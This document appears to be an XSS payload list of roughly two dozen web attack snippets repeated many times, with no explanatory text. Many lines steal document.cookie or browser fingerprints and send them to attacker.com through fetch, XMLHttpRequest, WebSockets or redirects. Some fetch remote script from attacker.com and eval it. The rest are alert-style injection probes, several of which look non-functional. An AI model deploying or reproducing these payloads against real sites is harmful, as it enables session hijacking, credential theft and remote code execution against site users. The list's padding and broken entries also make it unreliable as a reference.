<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
